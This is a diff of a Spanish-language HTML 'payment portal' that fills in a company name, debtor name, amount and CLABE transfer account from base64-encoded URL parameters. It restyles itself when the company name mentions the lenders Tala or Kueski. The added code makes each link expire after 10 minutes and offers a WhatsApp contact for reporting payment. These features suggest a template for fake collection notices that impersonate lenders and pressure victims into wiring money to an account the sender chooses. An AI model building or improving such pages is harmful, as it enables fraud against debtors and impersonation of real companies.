@@ -3,101 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Liquidación Oficial</title>
+    <title>Portal de Pago Seguro</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .card-shadow { box-shadow: 0 20px 50px rgba(0,0,0,0.1); }
-    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style> body { font-family: 'Inter', sans-serif; } </style>
 </head>
-<body class="bg-slate-100 flex items-center justify-center min-h-screen p-4">
+<body class="bg-slate-100 min-h-screen flex items-center justify-center p-4">
 
-    <div id="contenedorPrincipal" class="max-w-md w-full bg-white rounded-3xl card-shadow overflow-hidden border border-white">
-        <div id="headerColor" class="bg-blue-700 p-8 text-center text-white">
-            <div id="logo" class="text-6xl mb-3">🏦</div>
-            <h1 id="empresa" class="text-xl font-bold uppercase tracking-widest leading-tight">SISTEMA DE GESTIÓN</h1>
+    <div id="contentValid" class="max-w-md w-full bg-white rounded-[2rem] shadow-2xl overflow-hidden hidden">
+        <div id="header" class="bg-blue-900 p-8 text-center text-white relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-full bg-blue-800 opacity-50 transform rotate-3 scale-150"></div>
+            <div class="relative z-10">
+                <div id="logo" class="text-6xl mb-2">🏦</div>
+                <h1 id="empresa" class="text-lg font-bold uppercase tracking-widest opacity-90">COBRO SEGURO</h1>
+            </div>
         </div>
 
-        <div class="p-6 space-y-6">
+        <div class="p-8 space-y-6">
             <div class="text-center">
-                <p class="text-slate-400 text-xs uppercase font-bold tracking-tighter">Liquidación preparada para:</p>
-                <h2 id="cliente" class="text-2xl font-black text-slate-800 leading-tight">---</h2>
+                <p class="text-[10px] uppercase font-bold text-slate-400 tracking-widest">Liquidación Asignada a:</p>
+                <h2 id="cliente" class="text-xl font-black text-slate-800 mt-1">---</h2>
             </div>
 
-            <div class="bg-blue-50 rounded-2xl p-5 border border-blue-100 flex justify-between items-center">
-                <span class="text-slate-500 font-medium text-sm">Total a Pagar:</span>
-                <span id="monto" class="text-2xl font-black text-blue-700">$0.00 MXN</span>
+            <div class="bg-slate-50 p-6 rounded-2xl border border-slate-100 flex justify-between items-center">
+                <span class="text-xs font-bold text-slate-500 uppercase">Total a Pagar</span>
+                <span id="monto" class="text-2xl font-black text-blue-600">$0.00</span>
             </div>
 
-            <div class="space-y-4">
-                <p class="text-xs text-slate-600 font-bold px-1 italic">Cuenta CLABE para transferencia:</p>
-                <div id="cta" class="w-full bg-slate-900 text-green-400 p-5 rounded-xl text-center text-2xl font-mono font-bold border-2 border-slate-700 shadow-inner tracking-widest overflow-hidden">
+            <div class="space-y-3">
+                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest pl-1">Cuenta CLABE (Única)</p>
+                <div id="cta" class="w-full bg-slate-800 text-green-400 font-mono text-xl font-bold py-4 rounded-xl text-center tracking-wider shadow-inner">
                     0000 0000 0000 0000
                 </div>
-                <button onclick="copy()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-xl font-bold shadow-lg transition-all active:scale-95 text-lg">
-                    COPIAR CUENTA
+                <button onclick="copy()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-500/30 transition active:scale-95 uppercase text-sm tracking-wide">
+                    Copiar Cuenta
                 </button>
             </div>
 
-            <div class="pt-6 border-t border-slate-100 text-center">
-                <p class="text-[10px] text-slate-400 uppercase font-bold mb-3">¿Necesita asistencia inmediata?</p>
-                <a href="https://wa.me/5211234567890" id="linkWhatsapp" class="inline-flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full font-bold text-sm hover:bg-green-100 transition">
-                    <span class="text-lg">🟢</span> CONTACTAR ASESOR
+            <div class="text-center pt-4 border-t border-slate-100">
+                <a href="https://wa.me/5211234567890" class="inline-flex items-center gap-2 text-green-600 font-bold text-xs uppercase hover:underline">
+                    <span>💬</span> Reportar Pago por WhatsApp
                 </a>
             </div>
-            
-            <p class="text-[9px] text-center text-slate-300 leading-tight">
-                Notificación oficial de cobranza. La actualización del pago en sistema puede demorar de 1 a 24 horas.
-            </p>
+        </div>
+    </div>
+
+    <div id="contentExpired" class="max-w-md w-full bg-white rounded-3xl shadow-xl p-10 text-center hidden">
+        <div class="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4 text-red-500 text-3xl">
+            ⚠️
+        </div>
+        <h2 class="text-2xl font-black text-slate-800 mb-2">ENLACE CADUCADO</h2>
+        <p class="text-slate-500 text-sm mb-6">Por seguridad, este enlace de cobro ha expirado porque pasaron más de 10 minutos.</p>
+        <div class="bg-slate-50 p-4 rounded-xl text-xs text-slate-400">
+            Solicita un nuevo enlace a tu asesor.
         </div>
     </div>
 
     <script>
-        // Función para decodificar de forma segura
-        function decodeBase64(str) {
-            try {
-                return decodeURIComponent(escape(window.atob(str)));
-            } catch (e) {
-                return str; // Si no es base64, devuelve el original
-            }
-        }
+        function safeDecode(str) { try { return decodeURIComponent(escape(window.atob(str))); } catch(e) { return str; } }
 
         window.onload = () => {
-            const params = new URLSearchParams(window.location.search);
-            
-            // Extraer datos
-            const rawEmpresa = params.get('e');
-            const rawCliente = params.get('c');
-            const monto = params.get('m');
-            const rawCta = params.get('cta');
+            const p = new URLSearchParams(window.location.search);
+            const timeCreated = parseInt(p.get('t')); // Obtenemos el tiempo del link
+            const now = Date.now();
+            const tenMinutes = 10 * 60 * 1000; // 10 minutos en milisegundos
 
-            // Aplicar datos si existen
-            if (rawEmpresa) {
-                const nombreEmp = decodeBase64(rawEmpresa);
-                document.getElementById('empresa').innerText = nombreEmp;
+            // VALIDACIÓN DE TIEMPO
+            if (!timeCreated || (now - timeCreated > tenMinutes)) {
+                // Si no hay tiempo o ya pasaron 10 min
+                document.getElementById('contentExpired').classList.remove('hidden');
+            } else {
+                // Si es válido
+                document.getElementById('contentValid').classList.remove('hidden');
                 
-                // Lógica de logos dinámicos
-                const logo = document.getElementById('logo');
-                const header = document.getElementById('headerColor');
-                
-                if (nombreEmp.toLowerCase().includes("tala")) {
-                    logo.innerText = "🏦";
-                    header.classList.replace('bg-blue-700', 'bg-blue-800');
-                } else if (nombreEmp.toLowerCase().includes("kueski")) {
-                    logo.innerText = "💰";
-                    header.classList.replace('bg-blue-700', 'bg-blue-600');
-                }
+                // Llenar datos
+                try {
+                    const emp = safeDecode(p.get('e'));
+                    document.getElementById('empresa').innerText = emp;
+                    document.getElementById('cliente').innerText = safeDecode(p.get('c'));
+                    document.getElementById('monto').innerText = `$${p.get('m')} MXN`;
+                    document.getElementById('cta').innerText = safeDecode(p.get('cta'));
+
+                    if(emp.toLowerCase().includes("tala")) document.getElementById('header').classList.add('bg-blue-900');
+                    if(emp.toLowerCase().includes("kueski")) document.getElementById('header').className = 'bg-emerald-800 p-8 text-center text-white relative overflow-hidden';
+                } catch(e) {}
             }
-
-            if (rawCliente) document.getElementById('cliente').innerText = decodeBase64(rawCliente);
-            if (monto) document.getElementById('monto').innerText = `$${monto} MXN`;
-            if (rawCta) document.getElementById('cta').innerText = decodeBase64(rawCta);
         };
 
         function copy() {
-            const num = document.getElementById('cta').innerText.trim();
-            navigator.clipboard.writeText(num).then(() => {
-                alert("Número de cuenta copiado. Proceda a realizar su transferencia.");
-            });
+            const t = document.getElementById('cta').innerText.trim();
+            navigator.clipboard.writeText(t).then(() => alert("Cuenta copiada."));
         }
     </script>
 </body>
